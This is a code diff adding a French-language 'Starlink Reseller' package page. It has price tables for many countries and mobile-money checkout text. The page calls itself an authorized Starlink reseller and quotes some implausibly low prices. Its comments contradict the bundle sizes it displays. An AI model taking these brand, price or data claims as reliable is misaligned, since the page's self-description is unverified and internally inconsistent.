+                                <h3 class="font-bold text-lg text-gray-900">Forfait Pro</h3>
+                                <p class="text-gray-500 text-sm">60 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">CDF 18,000</p>
+                            <p class="pkg-price text-2xl font-black text-indigo-600">CDF 12,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">Usage intensif</span>
+                    </div>
+                </div>
+
+                <div class="monthly-cd-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="business-m" data-cdf="20000" data-original-cdf="30000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-gray-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-building text-2xl text-gray-700"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Business</h3>
+                                <p class="text-gray-500 text-sm">100 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">CDF 30,000</p>
+                            <p class="pkg-price text-2xl font-black text-gray-800">CDF 20,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-gray-100 text-gray-700 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-gray-100 text-gray-700 px-3 py-1 rounded-full">Entreprise</span>
+                    </div>
+                </div>
+
+                <!-- Monthly packages — Burkina Faso, hidden for all other countries -->
+                <div class="monthly-bf-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="basique-m-bf" data-cdf="1500" data-original-cdf="2500" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-green-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-signal-alt-3 text-2xl text-green-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Basique</h3>
+                                <p class="text-gray-500 text-sm">5 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">XOF 2,500</p>
+                            <p class="pkg-price text-2xl font-black text-green-600">XOF 1,500 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">Économique</span>
+                    </div>
+                </div>
+
+                <div class="monthly-bf-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="standard-m-bf" data-cdf="2500" data-original-cdf="4000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-blue-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-bolt text-2xl text-blue-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Standard</h3>
+                                <p class="text-gray-500 text-sm">15 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">XOF 4,000</p>
+                            <p class="pkg-price text-2xl font-black text-blue-600">XOF 2,500 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">Meilleur rapport</span>
+                    </div>
+                </div>
+
+                <div class="monthly-bf-card package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="premium-m-bf" data-cdf="5000" data-original-cdf="8000" style="display:none;">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-purple-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-rocket text-2xl text-purple-600"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-bold text-lg text-gray-900">Forfait Premium</h3>
+                                <p class="text-gray-500 text-sm">30 Go /mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="pkg-original-price">XOF 8,000</p>
+                            <p class="pkg-price text-2xl font-black text-purple-600">XOF 5,000 <span class="promo-tag">PROMO</span></p>
+                            <p class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">Données illimitées</span>
+                        <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">Streaming HD</span>
+                    </div>
+                </div>
+
+                <!-- Starter Bundle - 120GB -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="starter" data-cdf="30000" data-original-cdf="42000">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-green-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-signal-alt-3 text-2xl text-green-600"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-starter-name" class="font-bold text-lg text-gray-900">Forfait Starter</h3>
+                                <p id="pkg-starter-data" class="text-gray-500 text-sm">60 GB / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-starter-original" class="pkg-original-price">CDF 42,000</p>
+                            <p class="pkg-price text-2xl font-black text-green-600">CDF 30,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-starter-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full js-unlimited-badge">Données illimitées</span>
+                        <span id="pkg-starter-feature" class="text-xs bg-green-100 text-green-600 px-3 py-1 rounded-full">Économique</span>
+                    </div>
+                </div>
+
+                <!-- Standard Bundle - 250GB -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="standard" data-cdf="50000" data-original-cdf="70000">
+                    <span id="popular-badge" class="popular-badge">Populaire</span>
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-blue-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-bolt text-2xl text-blue-600"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-standard-name" class="font-bold text-lg text-gray-900">Forfait Avancé</h3>
+                                <p id="pkg-standard-data" class="text-gray-500 text-sm">125 GB / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-standard-original" class="pkg-original-price">CDF 70,000</p>
+                            <p class="pkg-price text-2xl font-black text-blue-600">CDF 50,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-standard-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full js-unlimited-badge">Données illimitées</span>
+                        <span id="pkg-standard-feature1" class="text-xs bg-blue-100 text-blue-600 px-3 py-1 rounded-full">Meilleur rapport</span>
+                    </div>
+                </div>
+
+                <!-- Premium Bundle - 400GB -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="premium" data-cdf="75000" data-original-cdf="105000">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-purple-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-rocket text-2xl text-purple-600"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-premium-name" class="font-bold text-lg text-gray-900">Forfait Élite</h3>
+                                <p id="pkg-premium-data" class="text-gray-500 text-sm">200 GB / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-premium-original" class="pkg-original-price">CDF 105,000</p>
+                            <p class="pkg-price text-2xl font-black text-purple-600">CDF 75,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-premium-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full js-unlimited-badge">Données illimitées</span>
+                        <span id="pkg-premium-feature1" class="text-xs bg-purple-100 text-purple-600 px-3 py-1 rounded-full">Streaming HD</span>
+                    </div>
+                </div>
+
+                <!-- Pro Bundle - 600GB -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="pro" data-cdf="100000" data-original-cdf="140000">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-cyan-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-cloud-data-connection text-2xl text-cyan-600"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-pro-name" class="font-bold text-lg text-gray-900">Forfait Pro</h3>
+                                <p id="pkg-pro-data" class="text-gray-500 text-sm">200 GB / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-pro-original" class="pkg-original-price">CDF 140,000</p>
+                            <p class="pkg-price text-2xl font-black text-cyan-600">CDF 100,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-pro-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-cyan-100 text-cyan-600 px-3 py-1 rounded-full js-unlimited-badge">Données illimitées</span>
+                        <span id="pkg-pro-feature1" class="text-xs bg-cyan-100 text-cyan-600 px-3 py-1 rounded-full">Usage intensif</span>
+                    </div>
+                </div>
+
+                <!-- Business Bundle - 1TB -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="business" data-cdf="150000" data-original-cdf="210000">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-indigo-100 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-briefcase-alt text-2xl text-indigo-600"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-business-name" class="font-bold text-lg text-gray-900">Forfait Business</h3>
+                                <p id="pkg-business-data" class="text-gray-500 text-sm">340 GB / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-business-original" class="pkg-original-price">CDF 210,000</p>
+                            <p class="pkg-price text-2xl font-black text-indigo-600">CDF 150,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-business-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full js-unlimited-badge">Données illimitées</span>
+                        <span id="pkg-business-feature1" class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">Entreprise</span>
+                        <span id="pkg-business-feature2" class="text-xs bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full">Support prioritaire</span>
+                    </div>
+                </div>
+
+                <!-- Unlimited Bundle -->
+                <div class="package-card bg-white rounded-2xl p-6 card-shadow border border-gray-100 relative" data-package="unlimited" data-cdf="250000" data-original-cdf="350000">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="w-14 h-14 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-xl flex items-center justify-center">
+                                <i class="uil uil-star text-2xl text-white"></i>
+                            </div>
+                            <div>
+                                <h3 id="pkg-unlimited-name" class="font-bold text-lg text-gray-900">Forfait Illimité</h3>
+                                <p id="pkg-unlimited-data" class="text-gray-500 text-sm">Données illimitées / mois</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p id="pkg-unlimited-original" class="pkg-original-price">CDF 350,000</p>
+                            <p class="pkg-price text-2xl font-black text-orange-500">CDF 250,000 <span class="promo-tag">PROMO</span></p>
+                            <p id="pkg-unlimited-period" class="text-xs text-gray-500">/mois</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 flex flex-wrap gap-2">
+                        <span class="text-xs bg-orange-100 text-orange-600 px-3 py-1 rounded-full js-unlimited-247">Illimité 24/7</span>
+                        <span id="pkg-unlimited-feature1" class="text-xs bg-orange-100 text-orange-600 px-3 py-1 rounded-full">Support VIP</span>
+                        <span id="pkg-unlimited-feature2" class="text-xs bg-orange-100 text-orange-600 px-3 py-1 rounded-full">IP statique</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Payment Info -->
+            <div class="bg-blue-50 rounded-2xl p-6 border border-blue-100">
+                <div class="flex items-start gap-3">
+                    <i class="uil uil-info-circle text-blue-600 text-xl mt-0.5"></i>
+                    <div>
+                        <h4 id="payment-info-title" class="font-bold text-gray-900 mb-1">Paiement Mobile Money (Airtel, Orange)</h4>
+                        <p id="payment-info-desc" class="text-sm text-gray-600">Cliquez d'abord sur un forfait ci-dessus, puis choisissez votre opérateur pour finaliser le paiement.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-40">
+            <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
+                <a href="/starlink/" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-wifi text-2xl"></i>
+                    <span id="bottom-status" class="text-xs font-semibold">Statut</span>
+                </a>
+                <a href="/starlink/plans.html" class="flex flex-col items-center gap-1 text-blue-600 transition-all">
+                    <i class="uil uil-shopping-bag text-2xl"></i>
+                    <span id="bottom-plans" class="text-xs font-semibold">Forfaits</span>
+                </a>
+                <a href="/starlink/orders.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-list-ul text-2xl"></i>
+                    <span id="bottom-orders" class="text-xs font-semibold">Commandes</span>
+                </a>
+                <a href="/starlink/settings.html" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                    <i class="uil uil-setting text-2xl"></i>
+                    <span id="bottom-settings" class="text-xs font-semibold">Paramètres</span>
+                </a>
+            </div>
+        </nav>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black text-gray-400 py-12 mt-12">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                <div>
+                    <h3 id="footer-brand" class="text-white font-bold mb-4">STARLINK</h3>
+                    <p id="footer-desc" class="text-sm">Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via Airtel Money.</p>
+                </div>
+                <div>
+                    <h3 class="text-white font-bold mb-4">SUPPORT</h3>
+                    <p class="text-sm">Email: support@starlink.reseller</p>
+                    <p id="footer-support-desc" class="text-sm">Disponible 24h/24, 7j/7 pour l'assistance technique.</p>
+                </div>
+                <div>
+                    <h3 id="footer-payment-title" class="text-white font-bold mb-4">PAIEMENT</h3>
+                    <p id="footer-payment-desc" class="text-sm">Payez en toute sécurité avec Airtel Money. Assurez-vous d'avoir un solde suffisant pour le forfait sélectionné.</p>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 pt-8 text-center">
+                <p id="footer-copyright">&copy; 2026 Starlink Reseller. Tous droits réservés.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ── Auth guard ──────────────────────────────────────────────────
+        (function() {
+            // No auth required — allow all users to browse packages freely
+        })();
+
+        // Country configurations with currency conversion rates (CDF as base)
+        const XAF_PRICES          = { 30000: 20000, 50000: 35000, 75000: 50000, 100000: 60000, 150000: 90000,  250000: 150000 };
+        const XAF_ORIGINAL_PRICES  = { 30000: 28000, 50000: 49000, 75000: 70000, 100000: 84000, 150000: 126000, 250000: 210000 };
+        const XOF_PRICES          = { 30000: 20000, 50000: 35000, 75000: 50000, 100000: 60000, 150000: 90000,  250000: 150000 };
+        const XOF_ORIGINAL_PRICES  = { 30000: 28000, 50000: 49000, 75000: 70000, 100000: 84000, 150000: 126000, 250000: 210000 };
+        const ZMW_PRICES          = { 30000: 15,    50000: 30,    75000: 45,    100000: 60,    150000: 90,     250000: 150   };
+        const ZMW_ORIGINAL_PRICES  = { 30000: 21,    50000: 42,    75000: 63,    100000: 84,    150000: 126,    250000: 210   };
+        const SLE_PRICES          = { 30000: 12,    50000: 21,    75000: 42,    100000: 84,    150000: 210,    250000: 420   };
+        const SLE_ORIGINAL_PRICES  = { 30000: 17,    50000: 30,    75000: 60,    100000: 120,   150000: 300,    250000: 600   };
+        const LRD_PRICES          = { 30000: 102,   50000: 170,   75000: 340,   100000: 680,   150000: 1020,   250000: 1700  };
+        const LRD_ORIGINAL_PRICES  = { 30000: 145,   50000: 240,   75000: 480,   100000: 950,   150000: 1430,   250000: 2400  };
+        const BJ_PRICES           = { 30000: 360,   50000: 600,   75000: 1200,  100000: 2400,  150000: 6000,   250000: 12000 };
+        const BJ_ORIGINAL_PRICES   = { 30000: 500,   50000: 840,   75000: 1680,  100000: 3360,  150000: 8400,   250000: 16800 };
+        const TD_PRICES           = { 30000: 1500,  50000: 2500,  75000: 5000,  100000: 10000, 150000: 25000,  250000: 50000  };
+        const TD_ORIGINAL_PRICES   = { 30000: 2100,  50000: 3500,  75000: 7000,  100000: 14000, 150000: 35000,  250000: 70000  };
+        const CG_PRICES           = { 30000: 1500,  50000: 2500,  75000: 3750,  100000: 5000,  150000: 7500,   250000: 12500  };
+        const CG_ORIGINAL_PRICES  = { 30000: 2100,  50000: 3500,  75000: 5250,  100000: 7000,  150000: 10500,  250000: 17500  };
+        const SN_PRICES           = { 30000: 1500,  50000: 2500,  75000: 3750,  100000: 5000,  150000: 7500,   250000: 12500  };
+        const SN_ORIGINAL_PRICES  = { 30000: 2100,  50000: 3500,  75000: 5250,  100000: 7000,  150000: 10500,  250000: 17500  };
+        const CD_PRICES  = { 30000: 11000, 50000: 15000, 75000: 20000 };
+        const CD_ORIGINAL_PRICES = { 30000: 15000, 50000: 20000, 75000: 28000 };
+        const BF_PRICES  = { 1500: 1500, 2500: 2500, 5000: 5000 };
+        const BF_ORIGINAL_PRICES = { 1500: 2500, 2500: 4000, 5000: 8000 };
+        const LSL_PRICES          = { 30000: 10,    50000: 18,    75000: 27,    100000: 35,    150000: 55,     250000: 90    };
+        const LSL_ORIGINAL_PRICES  = { 30000: 14,    50000: 25,    75000: 38,    100000: 49,    150000: 77,     250000: 126   };
+        const ZW_PRICES          = { 30000: 0.5,   50000: 0.75,  75000: 1.0,   100000: 1.5,   150000: 2.0,    250000: 3.0   };
+        const ZW_ORIGINAL_PRICES  = { 30000: 1.0,   50000: 1.5,   75000: 2.0,   100000: 3.0,   150000: 4.0,    250000: 6.0   };
+        const BWP_PRICES          = { 30000: 49,    50000: 79,    75000: 119,   100000: 159,   150000: 239,    250000: 399   };
+        const BWP_ORIGINAL_PRICES = { 30000: 69,    50000: 110,   75000: 169,   100000: 219,   150000: 335,    250000: 560   };
+        const JOD_PRICES          = { 30000: 0.50,  50000: 0.75,  75000: 1.00,  100000: 1.50,  150000: 2.00,   250000: 3.00  };
+        const JOD_ORIGINAL_PRICES = { 30000: 0.75,  50000: 1.00,  75000: 1.50,  100000: 2.00,  150000: 3.00,   250000: 5.00  };
+        const ETB_PRICES          = { 30000: 500,   50000: 800,   75000: 1200,  100000: 1800,  150000: 3000,   250000: 5000  };
+        const ETB_ORIGINAL_PRICES = { 30000: 700,   50000: 1100,  75000: 1700,  100000: 2500,  150000: 4200,   250000: 7000  };
+
+        const COUNTRY_CONFIG = {
+            'CD': { name: 'RDC', lang: 'fr', currency: 'CDF', rate: 1 },
+            'CG': { name: 'Congo', lang: 'fr', currency: 'XAF', rate: 0.667, prices: CG_PRICES, originalPrices: CG_ORIGINAL_PRICES },
+            'GA': { name: 'Gabon', lang: 'fr', currency: 'XAF', rate: 0.667, prices: XAF_PRICES, originalPrices: XAF_ORIGINAL_PRICES },
+            'TD': { name: 'Tchad', lang: 'fr', currency: 'XAF', rate: 0.667, prices: TD_PRICES, originalPrices: TD_ORIGINAL_PRICES },
+            'NE': { name: 'Niger', lang: 'fr', currency: 'XOF', rate: 0.667, prices: XOF_PRICES, originalPrices: XOF_ORIGINAL_PRICES },
+            'CM': { name: 'Cameroun', lang: 'fr', currency: 'XAF', rate: 0.667, prices: XAF_PRICES, originalPrices: XAF_ORIGINAL_PRICES },
+            'CF': { name: 'Centrafrique', lang: 'fr', currency: 'XAF', rate: 0.667, prices: XAF_PRICES, originalPrices: XAF_ORIGINAL_PRICES },
+            'GQ': { name: 'Guinée Équatoriale', lang: 'fr', currency: 'XAF', rate: 0.667, prices: XAF_PRICES, originalPrices: XAF_ORIGINAL_PRICES },
+            'SN': { name: 'Sénégal', lang: 'fr', currency: 'XOF', rate: 0.667, prices: SN_PRICES, originalPrices: SN_ORIGINAL_PRICES },
+            'ML': { name: 'Mali', lang: 'fr', currency: 'XOF', rate: 0.667, prices: XOF_PRICES, originalPrices: XOF_ORIGINAL_PRICES },
+            'BF': { name: 'Burkina Faso', lang: 'fr', currency: 'XOF', rate: 0.667, prices: BF_PRICES, originalPrices: BF_ORIGINAL_PRICES },
+            'CI': { name: 'Côte d\'Ivoire', lang: 'fr', currency: 'XOF', rate: 0.667, prices: XOF_PRICES, originalPrices: XOF_ORIGINAL_PRICES },
+            'TG': { name: 'Togo', lang: 'fr', currency: 'XOF', rate: 0.667, prices: XOF_PRICES, originalPrices: XOF_ORIGINAL_PRICES },
+            'BJ': { name: 'Bénin', lang: 'fr', currency: 'XOF', rate: 0.667, prices: BJ_PRICES, originalPrices: BJ_ORIGINAL_PRICES },
+            'MG': { name: 'Madagascar', lang: 'fr', currency: 'MGA', rate: 1.607 },
+            'DJ': { name: 'Djibouti', lang: 'fr', currency: 'DJF', rate: 0.0636 },
+            'KE': { name: 'Kenya', lang: 'en', currency: 'KES', rate: 0.046 },
+            'UG': { name: 'Uganda', lang: 'en', currency: 'UGX', rate: 1.321 },
+            'TZ': { name: 'Tanzania', lang: 'en', currency: 'TZS', rate: 0.893 },
+            'RW': { name: 'Rwanda', lang: 'en', currency: 'RWF', rate: 0.429 },
+            'NG': { name: 'Nigeria', lang: 'en', currency: 'NGN', rate: 0.554 },
+            'GH': { name: 'Ghana', lang: 'en', currency: 'GHS', rate: 0.00536 },
+            'ZM': { name: 'Zambia', lang: 'en', currency: 'ZMW', rate: 0.027, prices: ZMW_PRICES, originalPrices: ZMW_ORIGINAL_PRICES },
+            'MW': { name: 'Malawi', lang: 'en', currency: 'MWK', rate: 0.607 },
+            'ZA': { name: 'South Africa', lang: 'en', currency: 'ZAR', rate: 0.00643 },
+            'BW': { name: 'Botswana', lang: 'en', currency: 'BWP', rate: 0.005, prices: BWP_PRICES, originalPrices: BWP_ORIGINAL_PRICES },
+            'NA': { name: 'Namibia', lang: 'en', currency: 'NAD', rate: 0.00643 },
+            'MZ': { name: 'Mozambique', lang: 'en', currency: 'MZN', rate: 0.0229 },
+            'AO': { name: 'Angola', lang: 'en', currency: 'AOA', rate: 0.296 },
+            'ET': { name: '\u12a2\u1275\u12ee\u1335\u12eb', lang: 'am', currency: 'ETB', rate: 0.017, prices: ETB_PRICES, originalPrices: ETB_ORIGINAL_PRICES },
+            'SD': { name: 'Sudan', lang: 'en', currency: 'SDG', rate: 0.214 },
+            'SS': { name: 'South Sudan', lang: 'en', currency: 'SSP', rate: 0.046 },
+            'SO': { name: 'Somalia', lang: 'en', currency: 'SOS', rate: 0.204 },
+            'ER': { name: 'Eritrea', lang: 'en', currency: 'ERN', rate: 0.00536 },
+            'ZW': { name: 'Zimbabwe', lang: 'en', currency: 'USD', rate: 0.00036, prices: ZW_PRICES, originalPrices: ZW_ORIGINAL_PRICES },
+            'SC': { name: 'Seychelles', lang: 'en', currency: 'SCR', rate: 0.005 },
+            'SL': { name: 'Sierra Leone', lang: 'en', currency: 'SLE', rate: 0.008, prices: SLE_PRICES, originalPrices: SLE_ORIGINAL_PRICES },
+            'LR': { name: 'Liberia', lang: 'en', currency: 'LRD', rate: 0.068, prices: LRD_PRICES, originalPrices: LRD_ORIGINAL_PRICES },
+            'BI': { name: 'Burundi', lang: 'rn', currency: 'BIF', rate: 2.97 },
+            'LS': { name: 'Lesotho', lang: 'st', currency: 'LSL', rate: 0.054, prices: LSL_PRICES, originalPrices: LSL_ORIGINAL_PRICES },
+            'MM': { name: 'မြန်မာ', lang: 'my', currency: 'MMK', rate: 0.75 },
+            'JO': { name: 'الأردن', lang: 'ar', currency: 'JOD', rate: 0.000253, prices: JOD_PRICES, originalPrices: JOD_ORIGINAL_PRICES }
+        };
+
+        const translations = {
+            fr: {
+                pageTitle: 'Forfaits - Starlink', headerSubtitle: 'Revendeur', navStatus: 'Statut', navPlans: 'Forfaits',
+                navLogin: 'Connexion', navLogout: 'Déconnexion',
+                navOrders: 'Commandes', navSettings: 'Paramètres', plansSubtitle: 'Forfaits Internet',
+                plansTitle: 'Choisissez Votre Forfait', plansDesc: 'Sélectionnez un forfait et payez via Airtel Money pour activer immédiatement.',
+                pkgStarter: 'Forfait Starter', pkgStandard: 'Forfait Avancé', pkgPremium: 'Forfait Élite',
+                pkgPro: 'Forfait Pro', pkgBusiness: 'Forfait Business', pkgUnlimited: 'Forfait Illimité',
+                days: 'jours', twoMonths: '/mois', threeMonths: '/mois', oneMonth: '/mois', unlimitedData: 'Données illimitées', popular: 'Populaire',
+                budget: 'Économique', bestValue: 'Meilleur rapport', streamingHD: 'Streaming HD',
+                heavyUsage: 'Usage intensif', enterprise: 'Entreprise', prioritySupport: 'Support prioritaire',
+                unlimited247: 'Illimité 24/7', vipSupport: 'Support VIP', staticIP: 'IP statique',
+                paymentTitle: 'Paiement Airtel Money', paymentDesc: 'Cliquez d\u2019abord sur un forfait, puis s\u00e9lectionnez Airtel Money pour finaliser le paiement.',
+                payMethodTitle: 'Choisissez votre mode de paiement', payMethodSubtitle: 'Comment souhaitez-vous payer ?', payMethodAirtel: 'Payez avec votre portefeuille Airtel', cancelBtn: 'Annuler',
+                modalTitle: 'Traitement en cours...', modalSubtitle: 'Redirection sécurisée vers la passerelle de paiement Airtel Money', modalWarning: 'Veuillez ne pas actualiser la page',
+                footerDesc: 'Revendeur agréé de forfaits de données pour les services Starlink. Paiements rapides, fiables et sécurisés via Airtel Money.',
+                footerSupport: 'Disponible 24h/24, 7j/7 pour l\'assistance technique.',
+                footerPayment: 'Payez en toute sécurité avec Airtel Money. Assurez-vous d\'avoir un solde suffisant pour le forfait sélectionné.',
+                footerCopyright: '© 2026 Starlink Reseller. Tous droits réservés.',
+                configureBtn: 'Configurer', configureTitle: 'Aucun forfait actif',
+                configureMsg: "Vous n'avez pas encore de forfait actif pour ce service. Abonnez-vous maintenant pour l'activer.",
+                subscribeNow: "S'abonner maintenant", closeBtn: 'Fermer'
+            },
+            en: {
+                pageTitle: 'Packages - Starlink', headerSubtitle: 'Reseller', navStatus: 'Status', navPlans: 'Packages',
+                navLogin: 'Login', navLogout: 'Logout',
+                navOrders: 'Orders', navSettings: 'Settings', plansSubtitle: 'Internet Packages',
+                plansTitle: 'Choose Your Package', plansDesc: 'Select a package and pay via Airtel Money to activate immediately.',
+                pkgStarter: 'Starter Bundle', pkgStandard: 'Advanced Bundle', pkgPremium: 'Elite Bundle',
+                pkgPro: 'Pro Bundle', pkgBusiness: 'Business Bundle', pkgUnlimited: 'Unlimited Bundle',
+                days: 'days', twoMonths: '/2 months', threeMonths: '/3 months', oneMonth: '/month', unlimitedData: 'Unlimited data', popular: 'Popular',
+                budget: 'Budget-friendly', bestValue: 'Best value', streamingHD: 'HD Streaming',
+                heavyUsage: 'Heavy usage', enterprise: 'Enterprise', prioritySupport: 'Priority support',
+                unlimited247: 'Unlimited 24/7', vipSupport: 'VIP Support', staticIP: 'Static IP',
+                paymentTitle: 'Airtel Money Payment', paymentDesc: 'First click a package, then select Airtel Money to complete the payment.',
+                payMethodTitle: 'Select Payment Method', payMethodSubtitle: 'Choose how you want to pay', payMethodAirtel: 'Pay with your Airtel wallet', cancelBtn: 'Cancel',
+                modalTitle: 'Processing...', modalSubtitle: 'Secure redirection to the Airtel Money payment gateway', modalWarning: 'Please do not refresh the page',
+                footerDesc: 'Authorized reseller of data packages for Starlink services. Fast, reliable and secure payments via Airtel Money.',
+                footerSupport: 'Available 24/7 for technical support.',
+                footerPayment: 'Pay securely with Airtel Money. Make sure you have sufficient balance for the selected package.',
+                footerCopyright: '© 2026 Starlink Reseller. All rights reserved.',
+                configureBtn: 'Configure', configureTitle: 'No Active Package',
+                configureMsg: "You don't have an active subscription for this package. Subscribe now to activate it.",
+                subscribeNow: 'Subscribe Now', closeBtn: 'Close'
+            },
+            my: {
+                pageTitle: 'ပက်ကေ့ဂျ်များ - Starlink', headerSubtitle: 'ပြန်လည်ရောင်းချသူ', navStatus: 'အခြေအနေ', navPlans: 'ပက်ကေ့ဂျ်များ',
+                navLogin: 'ဝင်ရောက်မည်', navLogout: 'ထွက်မည်',
